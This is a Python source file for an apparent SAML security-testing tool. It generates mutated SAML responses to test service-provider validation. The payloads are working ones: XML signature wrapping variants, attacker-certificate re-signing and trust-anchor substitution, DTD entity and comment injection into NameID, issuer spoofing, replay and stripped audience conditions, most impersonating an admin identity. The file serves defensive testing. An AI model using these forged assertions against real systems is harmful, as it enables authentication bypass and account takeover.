"""SAML assertion mutation engine — covers I1, I2, I3, I4."""

from __future__ import annotations

import base64
import copy
import uuid
from datetime import datetime, timedelta, timezone

from cryptography import x509
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey
from lxml import etree

from src.engines.base import MutationEngine
from src.models.types import Credential, Invariant, Protocol
from src.utils.crypto import generate_rsa_key_pair, generate_self_signed_cert
from src.utils.saml_factory import SAMLFactory, SAML_NS, SAMLP_NS


class SAMLEngine(MutationEngine):
    """Mutation engine for SAML assertions."""

    def __init__(self, config: dict | None = None):
        super().__init__(Protocol.SAML)
        config = config or {}

        self.idp_entity_id: str = config.get("idp_entity_id", "http://idp.valence.local")
        self.sp_acs_url: str = config.get("sp_acs_url", "http://sp.valence.local/acs")
        self.legitimate_name_id: str = config.get("legitimate_name_id", "alice@valence.local")
        self.attributes: dict = config.get("attributes", {
            "email": "alice@valence.local",
            "groups": "developers",
            "role": "user",
        })

        # Legitimate keys
        legit_key = config.get("legitimate_signing_key")
        legit_cert = config.get("legitimate_signing_cert")
        if legit_key is None or legit_cert is None:
            legit_key, _ = generate_rsa_key_pair()
            legit_cert = generate_self_signed_cert(legit_key, cn="Legit IdP")
        self.legitimate_key: RSAPrivateKey = legit_key
        self.legitimate_cert: x509.Certificate = legit_cert

        # Attacker keys
        atk_key = config.get("attacker_signing_key")
        atk_cert = config.get("attacker_signing_cert")
        if atk_key is None or atk_cert is None:
            atk_key, _ = generate_rsa_key_pair()
            atk_cert = generate_self_signed_cert(atk_key, cn="Attacker IdP")
        self.attacker_key: RSAPrivateKey = atk_key
        self.attacker_cert: x509.Certificate = atk_cert

        self.factory = SAMLFactory(self.legitimate_key, self.legitimate_cert)
        self.attacker_factory = SAMLFactory(self.attacker_key, self.attacker_cert)

        self._register_all()

    # ------------------------------------------------------------------
    # Baseline
    # ------------------------------------------------------------------

    def generate_baseline(self, config: dict | None = None) -> Credential:
        in_response_to = f"_req_{uuid.uuid4().hex}"
        session_index = f"_sess_{uuid.uuid4().hex}"
        b64_resp = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            in_response_to=in_response_to,
            session_index=session_index,
            sign_response=True,
            sign_assertion=False,  # Single sig on Response — gosaml2 compat
        )
        return Credential(
            protocol=Protocol.SAML,
            raw_token=b64_resp,
            claims={
                "name_id": self.legitimate_name_id,
                "issuer": self.idp_entity_id,
                "in_response_to": in_response_to,
                "session_index": session_index,
            },
            metadata={
                "sp_acs_url": self.sp_acs_url,
                "relay_state": "",
            },
        )

    # ------------------------------------------------------------------
    # Mutation dispatch
    # ------------------------------------------------------------------

    def _apply_mutation(self, name: str, baseline: Credential, config: dict) -> Credential:
        entry = self._mutation_registry.get(name)
        if entry is None:
            raise ValueError(f"Unknown mutation: {name}")
        return entry["fn"](baseline)

    # ------------------------------------------------------------------
    # Registration
    # ------------------------------------------------------------------

    def _register_all(self) -> None:
        # I1 — Proof Integrity: XSW 1-8
        for v in range(1, 9):
            self.register_mutation(
                f"i1_xsw_{v}", Invariant.I1_PROOF_INTEGRITY,
                self._make_xsw(v),
                f"XML Signature Wrapping variant {v}",
                priority="high",
            )

        self.register_mutation("i1_unsigned_assertion_in_signed_response",
                               Invariant.I1_PROOF_INTEGRITY,
                               self._i1_unsigned_assertion,
                               "Response signed, Assertion not individually signed",
                               priority="normal")
        self.register_mutation("i1_resign_attacker_cert", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_resign_attacker,
                               "Re-sign entire Response with attacker certificate",
                               priority="normal")
        self.register_mutation("i1_saml_cert_substitution", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_cert_substitution,
                               "SAMLResponse signed with attacker-generated cert embedded in response — trust anchor substitution",
                               priority="critical", cve_pattern="Casdoor-F1")
        self.register_mutation("i1_dtd_entity_expansion", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_dtd_expansion,
                               "Inject DTD entity expansion in NameID",
                               priority="normal")
        self.register_mutation("i1_comment_injection", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_comment_injection,
                               "Inject XML comment inside NameID",
                               priority="normal")
        self.register_mutation("i1_encoding_divergence", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_encoding_divergence,
                               "Use XML character references in NameID",
                               priority="normal")

        # I1 — New high-priority mutations
        self.register_mutation("i1_saml_comment_in_nameid", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_comment_in_nameid_signed,
                               "Comment in NameID signed then consumed differently",
                               priority="critical", cve_pattern="canonicalization divergence")
        self.register_mutation("i1_saml_namespace_prefix_manipulation", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_namespace_prefix,
                               "Non-standard namespace prefixes in Assertion",
                               priority="high")
        self.register_mutation("i1_saml_whitespace_in_nameid", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_whitespace_nameid,
                               "Leading/trailing whitespace in NameID value",
                               priority="high")
        self.register_mutation("i1_saml_multiple_nameid", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_multiple_nameid,
                               "Two NameID elements in one Assertion",
                               priority="high")
        self.register_mutation("i1_saml_attribute_value_type", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_attribute_value_type,
                               "Attribute value with xsi:type=xs:integer",
                               priority="high", cve_pattern="CVE-2024-5798")

        # I2 — Freshness
        self.register_mutation("i2_replay_same_response", Invariant.I2_FRESHNESS,
                               self._i2_replay,
                               "Return exact same SAML Response for replay testing",
                               priority="normal")
        self.register_mutation("i2_expired_assertion", Invariant.I2_FRESHNESS,
                               self._i2_expired,
                               "Set NotOnOrAfter to past",
                               priority="normal")
        self.register_mutation("i2_inresponseto_mismatch", Invariant.I2_FRESHNESS,
                               self._i2_irt_mismatch,
                               "Use InResponseTo from different auth request",
                               priority="normal")
        self.register_mutation("i2_missing_inresponseto", Invariant.I2_FRESHNESS,
                               self._i2_missing_irt,
                               "Remove InResponseTo entirely",
                               priority="normal")
        self.register_mutation("i2_old_session_index", Invariant.I2_FRESHNESS,
                               self._i2_old_session,
                               "Reuse SessionIndex from expired session",
                               priority="normal")
        # I2 — New high-priority
        self.register_mutation("i2_saml_assertion_id_replay", Invariant.I2_FRESHNESS,
                               self._i2_assertion_id_replay,
                               "Replay SAML response with same Assertion ID",
                               priority="critical", cve_pattern="CVE-2018-14637")
        self.register_mutation("i2_saml_one_time_use_replay", Invariant.I2_FRESHNESS,
                               self._i2_saml_one_time_use_replay,
                               "SAML assertion with OneTimeUse condition submitted twice",
                               priority="high")
        self.register_mutation(
            "i2_saml_no_conditions",
            Invariant.I2_FRESHNESS,
            self._i2_no_conditions,
            "SAML assertion with Conditions element removed — no expiration, no audience",
            priority="high",
            cve_pattern="CVE-2020-5390",
        )

        # I3 — Flow Coherence
        self.register_mutation("i3_response_cross_session", Invariant.I3_FLOW_COHERENCE,
                               self._i3_cross_session,
                               "Inject SAML Response from session A into session B",
                               priority="normal")

        # I5 — Authorization Binding (SAML audience/conditions)
        self.register_mutation("i5_saml_no_conditions", Invariant.I5_AUTHORIZATION_BINDING,
                               self._i5_saml_no_conditions,
                               "Remove entire <Conditions> element from SAML assertion",
                               priority="high")
        self.register_mutation("i5_saml_no_audience_restriction", Invariant.I5_AUTHORIZATION_BINDING,
                               self._i5_saml_no_audience_restriction,
                               "Remove <AudienceRestriction> but keep time bounds in Conditions",
                               priority="high")
        self.register_mutation("i5_saml_wrong_audience", Invariant.I5_AUTHORIZATION_BINDING,
                               self._i5_saml_wrong_audience,
                               "Set SAML <Audience> to a different SP entity ID",
                               priority="high")

        # I1 — Issuer mismatch
        self.register_mutation("i1_saml_issuer_mismatch", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_saml_issuer_mismatch,
                               "SAML assertion with untrusted Issuer entity ID, signed with attacker key",
                               priority="high")
        self.register_mutation("i1_saml_issuer_empty", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_saml_issuer_empty,
                               "SAML assertion with empty <Issuer> element",
                               priority="high")

        # I1 — Spurious/detached signature
        self.register_mutation("i1_saml_spurious_signature", Invariant.I1_PROOF_INTEGRITY,
                               self._i1_saml_spurious_signature,
                               "Response has Signature covering envelope only, assertion unsigned",
                               priority="high")

        # I4 — Principal Binding
        self.register_mutation("i4_nameid_from_attribute", Invariant.I4_PRINCIPAL_BINDING,
                               self._i4_nameid_vs_attribute,
                               "NameID=user but Attribute email=admin",
                               priority="normal")
        self.register_mutation("i4_dual_assertion_identity", Invariant.I4_PRINCIPAL_BINDING,
                               self._i4_dual_assertion,
                               "Two assertions with different NameIDs",
                               priority="normal")

    # ------------------------------------------------------------------
    # I1 mutations — existing
    # ------------------------------------------------------------------

    def _make_xsw(self, variant: int):
        def fn(baseline: Credential) -> Credential:
            b64 = self.factory.create_xsw_response(
                variant=variant,
                legitimate_name_id=self.legitimate_name_id,
                malicious_name_id="admin@evil.com",
                issuer=self.idp_entity_id,
                destination=self.sp_acs_url,
                attributes=self.attributes,
            )
            return self._saml_cred(b64, baseline)
        return fn

    def _i1_unsigned_assertion(self, baseline: Credential) -> Credential:
        b64 = self.factory.create_unsigned_assertion_in_signed_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            malicious_name_id="admin@evil.com",
            attributes=self.attributes,
        )
        return self._saml_cred(b64, baseline)

    def _i1_resign_attacker(self, baseline: Credential) -> Credential:
        # Response-only signing — maximises SP compatibility (gosaml2 etc.)
        b64 = self.attacker_factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            sign_response=True,
            sign_assertion=False,
        )
        return self._saml_cred(b64, baseline)

    def _i1_cert_substitution(self, baseline: Credential) -> Credential:
        """SAMLResponse signed with attacker-generated cert embedded in response.

        I1 violation: platform should reject because cert doesn't match
        the pre-configured IdP certificate.  The attacker controls signing,
        so we use response-only signing for maximum SP compatibility (many
        SAML SPs, including gosaml2, reject double-signed envelopes).
        """
        # Attacker asserts admin identity, signs with their own key+cert
        admin_attrs = dict(self.attributes)
        admin_attrs["email"] = "admin@target.com"
        admin_attrs["role"] = "admin"
        b64 = self.attacker_factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id="admin",
            attributes=admin_attrs,
            sign_response=True,
            sign_assertion=False,
        )
        cred = self._saml_cred(b64, baseline)
        cred.claims["name_id"] = "admin"
        cred.metadata["mutation_note"] = (
            "SAMLResponse signed with attacker-generated cert embedded in "
            "ds:X509Certificate — if accepted, platform trusts arbitrary certs"
        )
        cred.metadata["cve_pattern"] = "Casdoor-F1"
        return cred

    def _i1_dtd_expansion(self, baseline: Credential) -> Credential:
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id="PLACEHOLDER_ENTITY",
            attributes=self.attributes,
        )
        xml = base64.b64decode(b64).decode("utf-8")
        dtd = '<!DOCTYPE foo [<!ENTITY xxe "admin@evil.com">]>'
        xml = xml.replace("<?xml version='1.0' encoding='UTF-8'?>",
                          "<?xml version='1.0' encoding='UTF-8'?>" + dtd, 1)
        xml = xml.replace("PLACEHOLDER_ENTITY", "&xxe;")
        return self._saml_cred(base64.b64encode(xml.encode()).decode(), baseline)

    def _i1_comment_injection(self, baseline: Credential) -> Credential:
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id="adm<!-- -->in@valence.local",
            attributes=self.attributes,
        )
        return self._saml_cred(b64, baseline)

    def _i1_encoding_divergence(self, baseline: Credential) -> Credential:
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id="ENCODE_PLACEHOLDER",
            attributes=self.attributes,
        )
        xml = base64.b64decode(b64).decode("utf-8")
        xml = xml.replace("ENCODE_PLACEHOLDER", "&#x61;dmin@valence.local")
        return self._saml_cred(base64.b64encode(xml.encode()).decode(), baseline)

    # I1 — New mutations

    def _i1_comment_in_nameid_signed(self, baseline: Credential) -> Credential:
        """Insert comment in NameID BEFORE signing. Tests if broker strips
        comments after signature validation, yielding different identity."""
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id="adm<!-- -->in@evil.com",
            attributes=self.attributes,
            sign_response=True,
            sign_assertion=True,
        )
        return self._saml_cred(b64, baseline)

    def _i1_namespace_prefix(self, baseline: Credential) -> Credential:
        """Use non-standard namespace prefixes in the Assertion XML."""
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
        )
        xml = base64.b64decode(b64).decode("utf-8")
        # Replace standard saml: prefix with x: while keeping namespace URI
        xml = xml.replace(
            'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"',
            'xmlns:x="urn:oasis:names:tc:SAML:2.0:assertion"',
        )
        xml = xml.replace("<saml:", "<x:")
        xml = xml.replace("</saml:", "</x:")
        return self._saml_cred(base64.b64encode(xml.encode()).decode(), baseline)

    def _i1_whitespace_nameid(self, baseline: Credential) -> Credential:
        """Add leading/trailing whitespace to NameID value, signed as-is."""
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id="  admin@evil.com  ",
            attributes=self.attributes,
            sign_response=True,
            sign_assertion=True,
        )
        return self._saml_cred(b64, baseline)

    def _i1_multiple_nameid(self, baseline: Credential) -> Credential:
        """Include two NameID elements in one Assertion."""
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id="user@normal.com",
            attributes=self.attributes,
            sign_response=False,
            sign_assertion=False,
        )
        xml_bytes = base64.b64decode(b64)
        root = etree.fromstring(xml_bytes)
        subjects = root.findall(f".//{{{SAML_NS}}}Subject")
        for subj in subjects:
            extra_nid = etree.SubElement(
                subj, f"{{{SAML_NS}}}NameID",
                attrib={"Format": "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress"},
            )
            extra_nid.text = "admin@evil.com"
        xml_out = etree.tostring(root, xml_declaration=True, encoding="UTF-8")
        return self._saml_cred(base64.b64encode(xml_out).decode(), baseline)

    def _i1_attribute_value_type(self, baseline: Credential) -> Credential:
        """Set SAML Attribute value with xsi:type=xs:integer."""
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            sign_response=False,
            sign_assertion=False,
        )
        xml_bytes = base64.b64decode(b64)
        root = etree.fromstring(xml_bytes)
        XSI_NS = "http://www.w3.org/2001/XMLSchema-instance"
        attr_vals = root.findall(f".//{{{SAML_NS}}}AttributeValue")
        if attr_vals:
            av = attr_vals[0]
            av.set(f"{{{XSI_NS}}}type", "xs:integer")
            av.text = "99999"
        xml_out = etree.tostring(root, xml_declaration=True, encoding="UTF-8")
        return self._saml_cred(base64.b64encode(xml_out).decode(), baseline)

    # ------------------------------------------------------------------
    # I2 mutations
    # ------------------------------------------------------------------

    def _i2_replay(self, baseline: Credential) -> Credential:
        return copy.deepcopy(baseline)

    def _i2_expired(self, baseline: Credential) -> Credential:
        b64 = self.factory.create_expired_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            expired_minutes_ago=60,
        )
        return self._saml_cred(b64, baseline)

    def _i2_irt_mismatch(self, baseline: Credential) -> Credential:
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            in_response_to="different-request-id",
        )
        return self._saml_cred(b64, baseline)

    def _i2_missing_irt(self, baseline: Credential) -> Credential:
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            in_response_to=None,
        )
        return self._saml_cred(b64, baseline)

    def _i2_old_session(self, baseline: Credential) -> Credential:
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            session_index="expired-session-12345",
        )
        return self._saml_cred(b64, baseline)

    def _i2_assertion_id_replay(self, baseline: Credential) -> Credential:
        """Same assertion ID replayed — SAML spec 2.5.1 requires ID tracking."""
        c = copy.deepcopy(baseline)
        c.metadata["auth_context"] = "saml_assertion"
        c.metadata["mutation_note"] = (
            "Submit same SAML response twice; second must be rejected per "
            "SAML spec Section 2.5.1 assertion ID tracking")
        c.metadata["replay"] = True
        return c

    # ------------------------------------------------------------------
    # I3 mutations
    # ------------------------------------------------------------------

    def _i3_cross_session(self, baseline: Credential) -> Credential:
        c = copy.deepcopy(baseline)
        c.metadata["mutation_note"] = "SAML response from session A injected into session B"
        c.metadata["relay_state"] = "cross-session-state"
        return c

    # ------------------------------------------------------------------
    # I5 mutations — Authorization Binding (SAML audience/conditions)
    # ------------------------------------------------------------------

    def _i5_saml_no_conditions(self, baseline: Credential) -> Credential:
        """Remove the entire <Conditions> element from the SAML assertion.

        Per SAML Core 2.5.1, Conditions constrains assertion validity.
        A conformant SP MUST enforce Conditions when present, and SHOULD
        reject assertions without AudienceRestriction. If accepted without
        Conditions, the assertion is unbounded in audience and time.
        """
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            sign_response=False,
            sign_assertion=False,
        )
        xml_bytes = base64.b64decode(b64)
        root = etree.fromstring(xml_bytes)
        # Remove all <Conditions> elements from all assertions
        for conditions in root.findall(f".//{{{SAML_NS}}}Conditions"):
            conditions.getparent().remove(conditions)
        xml_out = etree.tostring(root, xml_declaration=True, encoding="UTF-8")
        cred = self._saml_cred(base64.b64encode(xml_out).decode(), baseline)
        cred.metadata["mutation_note"] = (
            "SAML assertion with <Conditions> element entirely removed — "
            "no AudienceRestriction, no time bounds"
        )
        return cred

    def _i5_saml_no_audience_restriction(self, baseline: Credential) -> Credential:
        """Remove <AudienceRestriction> from <Conditions> but keep time bounds.

        Per SAML Core 2.5.1.2, AudienceRestriction specifies which SPs
        may consume the assertion. Without it, any SP could accept it.
        """
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            sign_response=False,
            sign_assertion=False,
        )
        xml_bytes = base64.b64decode(b64)
        root = etree.fromstring(xml_bytes)
        for aud_restr in root.findall(f".//{{{SAML_NS}}}AudienceRestriction"):
            aud_restr.getparent().remove(aud_restr)
        xml_out = etree.tostring(root, xml_declaration=True, encoding="UTF-8")
        cred = self._saml_cred(base64.b64encode(xml_out).decode(), baseline)
        cred.metadata["mutation_note"] = (
            "SAML assertion with <AudienceRestriction> removed from <Conditions> — "
            "time bounds intact but no audience scoping"
        )
        return cred

    def _i5_saml_wrong_audience(self, baseline: Credential) -> Credential:
        """Set <Audience> to a different SP entity ID.

        Tests whether the SP validates that the AudienceRestriction
        matches its own entity ID.
        """
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            sign_response=False,
            sign_assertion=False,
        )
        xml_bytes = base64.b64decode(b64)
        root = etree.fromstring(xml_bytes)
        for aud_elem in root.findall(f".//{{{SAML_NS}}}Audience"):
            aud_elem.text = "http://wrong-service.example.com/sp"
        xml_out = etree.tostring(root, xml_declaration=True, encoding="UTF-8")
        cred = self._saml_cred(base64.b64encode(xml_out).decode(), baseline)
        cred.metadata["mutation_note"] = (
            "SAML assertion with <Audience> set to a different SP — "
            "tests audience restriction enforcement"
        )
        return cred

    # ------------------------------------------------------------------
    # I1 mutations — Issuer mismatch
    # ------------------------------------------------------------------

    def _i1_saml_issuer_mismatch(self, baseline: Credential) -> Credential:
        """Set the SAML Issuer to a different IdP entity ID.

        Tests whether the SP validates that the assertion's Issuer matches
        the configured/trusted IdP entity ID. A different issuer with a
        valid signature from a different key would indicate issuer bypass.
        """
        attacker_issuer = "http://attacker-idp.evil.com/saml"
        b64 = self.attacker_factory.create_response(
            issuer=attacker_issuer,
            destination=self.sp_acs_url,
            name_id="admin@evil.com",
            attributes=self.attributes,
            sign_response=True,
            sign_assertion=True,
        )
        cred = self._saml_cred(b64, baseline)
        cred.claims["name_id"] = "admin@evil.com"
        cred.metadata["mutation_note"] = (
            "SAML assertion with Issuer set to untrusted IdP entity ID, "
            "signed with attacker key — tests issuer validation"
        )
        return cred

    def _i1_saml_issuer_empty(self, baseline: Credential) -> Credential:
        """Set the SAML Issuer to empty string.

        Tests whether the SP requires a non-empty Issuer value and validates
        it against the trusted IdP configuration.
        """
        b64 = self.factory.create_response(
            issuer="",
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            sign_response=False,
            sign_assertion=False,
        )
        xml_bytes = base64.b64decode(b64)
        root = etree.fromstring(xml_bytes)
        # Clear all Issuer elements
        for issuer_elem in root.findall(f".//{{{SAML_NS}}}Issuer"):
            issuer_elem.text = ""
        xml_out = etree.tostring(root, xml_declaration=True, encoding="UTF-8")
        cred = self._saml_cred(base64.b64encode(xml_out).decode(), baseline)
        cred.metadata["mutation_note"] = (
            "SAML assertion with empty <Issuer> — tests whether SP requires "
            "non-empty issuer validation"
        )
        return cred

    # ------------------------------------------------------------------
    # I1 mutations — Spurious/detached signature
    # ------------------------------------------------------------------

    def _i1_saml_spurious_signature(self, baseline: Credential) -> Credential:
        """Unsigned assertion inside response that has a Signature element
        NOT covering the assertion.

        Creates a response with a valid Signature element (from attacker key)
        that covers only the Response, but the assertion itself is unsigned.
        A naive SP might see the Signature element and assume the assertion
        is verified.
        """
        b64 = self.attacker_factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id="admin@evil.com",
            attributes=self.attributes,
            sign_response=True,
            sign_assertion=False,
        )
        cred = self._saml_cred(b64, baseline)
        cred.claims["name_id"] = "admin@evil.com"
        cred.metadata["mutation_note"] = (
            "SAML Response with Signature element covering only the Response "
            "envelope, assertion itself unsigned — tests whether SP verifies "
            "assertion-level signature vs just checking a Signature exists"
        )
        return cred

    # ------------------------------------------------------------------
    # I2 mutations — OneTimeUse enforcement
    # ------------------------------------------------------------------

    def _i2_saml_one_time_use_replay(self, baseline: Credential) -> Credential:
        """Create a SAML assertion with OneTimeUse condition, intended for replay.

        Per SAML Core 2.5.1.5, an assertion with OneTimeUse MUST be discarded
        after first consumption. Replaying it tests whether the SP tracks used
        assertion IDs.
        """
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            sign_response=True,
            sign_assertion=True,
        )
        # Add <OneTimeUse/> element to Conditions
        xml_bytes = base64.b64decode(b64)
        root = etree.fromstring(xml_bytes)
        for conditions in root.findall(f".//{{{SAML_NS}}}Conditions"):
            etree.SubElement(conditions, f"{{{SAML_NS}}}OneTimeUse")
        xml_out = etree.tostring(root, xml_declaration=True, encoding="UTF-8")
        cred = self._saml_cred(base64.b64encode(xml_out).decode(), baseline)
        cred.metadata["replay"] = True
        cred.metadata["mutation_note"] = (
            "SAML assertion with <OneTimeUse/> condition — submit twice; "
            "second must be rejected per SAML Core 2.5.1.5"
        )
        return cred

    def _i2_no_conditions(self, baseline: Credential) -> Credential:
        """SAML assertion with <Conditions> element completely absent.
        Per SAML spec the absence means unconditionally valid — but brokers
        should reject in SP/broker contexts (authentik F-1, Keycloak F-5)."""
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id=self.legitimate_name_id,
            attributes=self.attributes,
            sign_response=True,
            sign_assertion=True,
        )
        xml_bytes = base64.b64decode(b64)
        root = etree.fromstring(xml_bytes)
        for conditions in root.findall(f".//{{{SAML_NS}}}Conditions"):
            conditions.getparent().remove(conditions)
        xml_out = etree.tostring(root, xml_declaration=True, encoding="UTF-8")
        return self._saml_cred(base64.b64encode(xml_out).decode(), baseline)

    # ------------------------------------------------------------------
    # I4 mutations
    # ------------------------------------------------------------------

    def _i4_nameid_vs_attribute(self, baseline: Credential) -> Credential:
        attrs = dict(self.attributes)
        attrs["email"] = "admin@target.com"
        b64 = self.factory.create_response(
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            name_id="user@normal.com",
            attributes=attrs,
        )
        return self._saml_cred(b64, baseline)

    def _i4_dual_assertion(self, baseline: Credential) -> Credential:
        b64 = self.factory.create_xsw_response(
            variant=7,
            legitimate_name_id="user@normal.com",
            malicious_name_id="admin@evil.com",
            issuer=self.idp_entity_id,
            destination=self.sp_acs_url,
            attributes=self.attributes,
        )
        return self._saml_cred(b64, baseline)

    # ------------------------------------------------------------------
    # Helper
    # ------------------------------------------------------------------

    @staticmethod
    def _saml_cred(b64_response: str, baseline: Credential) -> Credential:
        return Credential(
            protocol=Protocol.SAML,
            raw_token=b64_response,
            claims=dict(baseline.claims),
            metadata=dict(baseline.metadata),
        )
